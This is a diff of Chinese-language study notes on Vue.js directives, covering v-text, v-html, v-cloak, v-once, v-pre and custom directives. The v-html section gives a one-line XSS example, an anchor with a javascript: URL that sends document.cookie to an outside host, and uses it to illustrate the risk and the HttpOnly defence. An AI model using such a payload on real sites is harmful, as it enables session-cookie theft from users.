@@ -768,12 +768,111 @@ Vue.set(),vm.$set()
     </script>
 ```
 
-## v-text 指令
+## 内置指令
 
-> 向其所在的节点中渲染文本内容
+### v-text 指令
+
+> 向其所在的节点中**渲染文本内容**
 >
 
 与插值语法的区别：v-text会**替换节点中的内容**,{{xx}}不会
 
-## v-html
+### v-html
+
+> 向指定节点中渲染包含**html结构**的内容
+
+安全性问题！！！注意XSS攻击
+
+```html
+<a href=javascript:location.href="http://152.??.com?"+document.cookie>XXX</a>
+```
+
+`HttpOnly属性`：只能http协议能够携带获取
+
+### v-cloak
+
+> **Vue实例创建完毕并接管容器后，会删除v-cloak属性**
+>
+> 配置css可解决网速慢页面展示{{xx}}的问题
+
+```html
+属性选择器
+[v-cloak]{
+	display:none
+}
+<div v-cloak>{{name}}</div>
+```
+
+### v-once
+
+> **v-once所在节点在初次动态渲染后，视为静态资源**
+>
+> 以后数据不会更新
+
+```html
+<div v-once>{{n}}</div>
+```
+
+### v-pre
+
+> **跳过所在节点的编译过程**
+>
+> 跳过没有使用指令和插值语法的节点，加快编译
+
+## 自定义指令
+
+### 局部指令
+
+```vue
+<span v-big-number="n"></span>
+<script>
+    directives: {
+        		xx(element, binding){},
+                xx:function (element, binding){
+                  //不包含inserted
+                },
+                'xx-xx':{
+                    //指令与元素成功绑定
+                    bind(element,binding){
+
+                    },
+                    //指令所在元素被插入页面
+                    inserted(element,binding){
+						binding.focus();//自动获取焦点
+                    },
+                    //指令所在模板被重新解析
+                    update(element,binding){
+
+                    }
+                }
+            }
+    </script>
+```
+
+### 全局指令
+
+```vue
+<script>
+    Vue.directive('xx-xx',{});
+	Vue.directive('xx-xx',function (element,binding){});
+</script>
+```
+
+
+
+<img src="https://gitee.com/LovelyHzz/imgSave/raw/master/note/202201102140108.png" alt="image-20220110214027981" style="zoom:80%;" />
+
+什么时候调用此指令？
+
+1. 指令与元素成功绑定
+2. 指定所在模板被重新解析
+
+`注意`：
+
++ 指令定义不加**v-**，使用时加
+
++ case命名使用kebab-case形式。不能使用camelCase
++ this作用域为`window`
+
+## 生命周期
 
